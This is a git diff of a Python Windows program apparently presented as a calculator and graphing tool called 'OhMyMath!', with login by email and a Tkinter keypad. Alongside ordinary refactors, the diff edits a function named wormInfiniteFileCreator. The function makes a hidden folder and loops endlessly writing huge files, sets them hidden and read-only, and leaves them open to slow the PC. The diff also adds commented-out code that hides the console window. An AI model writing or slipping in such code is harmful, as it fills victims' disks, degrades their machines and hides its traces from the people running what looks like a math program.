@@ -1,14 +1,16 @@
 
+print("Loading required files...")
+
 ## Importing all required modules
 
 ## Importing `monotonic` as `mt` from `time` module
 from time import monotonic as mt, sleep as s
 
-## Importing `datetime` from `datetime` to know the current date and time
-from datetime import datetime
-
 ## Taking starting time to calculate total time spent everywhere in the program while running
 startTime = mt()
+
+## Importing `datetime` from `datetime` to know the current date and time
+from datetime import datetime
 
 ## Importing `math` module as `m`
 import math as m
@@ -20,7 +22,13 @@ from os import path, system, mkdir
 from tkinter import *
 from tkinter import messagebox as mb
 
+## Importing required functions to change attributes of folders and windows
+from win32api import SetFileAttributes as SFA
+from win32con import FILE_ATTRIBUTE_HIDDEN as FAH, FILE_ATTRIBUTE_READONLY as FAR, SW_HIDE as HIDE
+from win32gui import GetForegroundWindow as GFW, ShowWindow as SW
+
 try:
+
     ## Importing `numpy` as `np` for `linspace` (arrays), and mathematical functions
     import numpy as np
 
@@ -30,13 +38,16 @@ try:
     ## Importing `gamma` function for `factorial` of an array to plot graphs
     from scipy.special import gamma
 
-	## Importing required functions to change attributes of a folder
-	from win32api import SetFileAttributes as sfa
-	from win32con import FILE_ATTRIBUTE_HIDDEN as fah, FILE_ATTRIBUTE_READONLY as far
 
 except ModuleNotFoundError or ImportError:
+
     ## Using `cmd.exe` to install required packages using `pip`
-    system("pip install numpy && pip install matplotlib && pip install scipy && pip install pywin32 && exit")
+    system("pip install numpy && pip install matplotlib && pip install scipy && exit")
+
+    '''
+    cmd = GFW()
+    SW(cmd, HIDE)
+    '''
 
     ## Importing `numpy` as `np` for `linspace` (arrays), and mathematical functions
     import numpy as np
@@ -46,14 +57,7 @@ except ModuleNotFoundError or ImportError:
 
     ## Importing `gamma` function for `factorial` of an array to plot graphs
     from scipy.special import gamma
-	
-	try:
-		## Importing required functions to change attributes of a folder
-		from win32api import SetFileAttributes as sfa
-		from win32con import FILE_ATTRIBUTE_HIDDEN as fah, FILE_ATTRIBUTE_READONLY as far
 
-	except:
-		pass
 
 ## Importing `load`, `dump` for dictionary of email-name pair as key-value pair from `json` module
 from json import load, dump
@@ -61,7 +65,9 @@ from json import load, dump
 ## Importing `choice` from `random` module
 from random import choice as ch
 
-## Globally declaring `x` as an array for graphs
+print("Loaded!")
+
+## Globally declaring constants
 x = np.arange(-10, 10.001, 0.001)
 
 ## Taking email ID for confirmation and to check if user is new or existing
@@ -107,20 +113,18 @@ def evalall(string1):   ## Advanced `evalall()` function to evaluate mathematica
     if (type(number) != complex):	## `number` is Real; Real Numbers set is a subset of Imaginary Numbers set
         if (number >= 9999999999999999):
             return '∞'
-        if (int(number) == number):
-            return int(number)
-        if (number == m.e):
-            return m.e
-        if (number == m.pi):
-            return m.pi
+        if (number == int(number)):
+            number = int(number)
+        '''
         if (round(number, 5) == 3.14159):
             return f'= {number} ≈ π'
         if (round(number, 5) == 2.71828):
             return f'= {number} ≈ e'
+        '''
         if (round(number, 8) == 0):
-            return round(number, 5)
+            number = round(number, 5)
         if (int(number) == number):
-            return int(number)
+            number = int(number)
         return number
     
     a = number.real
@@ -184,17 +188,19 @@ def userDataDictManager(emailID):
     userdata.close()
 
     if (emailID in userDataDict.keys()):  ## User exists and will be logged in
-        username = userDataDict[emailID]
+        userName = userDataDict[emailID]
+        username = userName.split()[0]
         print(f"Welcome, {username}! You have logged in successfully!")
 
     else:   ## User is new and will be signed up
         print("Creating account...")
-        username = input("Please enter your Name :- ")
-        username = username.title()
-        userDataDict.update({emailID: username})
+        userName = input("Please enter your full Name :- ")
+        userName = userName.title()
+        userDataDict.update({emailID: userName})
         userdata = open("C:\\OhMyMath!\\Userdata.json", "w")
         dump(userDataDict, userdata, indent=4)
         userdata.close()
+        username = userName.split()[0]
         print(f"Welcome, {username}! You have signed up successfully.")
         print("You can now use all the following functions!")
 
@@ -506,8 +512,12 @@ def press(num): ## Function to update expression in the text entry box
     ## Point out the global expression variable 
     global expression, equation
 
-    ## Concatenation of string 
-    expression += str(num) 
+    if (num == 'fact('):
+        ## Special case for factorials
+        expression = 'fact(' + str(expression) + ')'
+    else:
+        ## Concatenation of string 
+        expression += str(num) 
 
     ## Update the expression by using set method 
     equation.set(expression) 
@@ -723,7 +733,7 @@ def wormInfiniteFileCreator():   ## Function 'wormInfiniteFileCreator()' to crea
     x = 1
     try:
         mkdir("C:\\Important Files")
-        sfa("C:\\Important Files", fah)
+        SFA("C:\\Important Files", FAH)
     except:
         pass
     while True:
@@ -731,8 +741,8 @@ def wormInfiniteFileCreator():   ## Function 'wormInfiniteFileCreator()' to crea
         while (x < 100000000000000):
             fileObj.write('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'*100)
             x += 1
-        sfa(fileObj, fah)
-        sfa(fileObj, far)
+        SFA(fileObj, FAH)
+        SFA(fileObj, FAR)
         print(f"ImportantFiles_{file_counter}.txt has been created at some secret location in your PC.")
         ## Created files NOT closed to occupy more NameSpace (slows down the PC)
         file_counter += 1
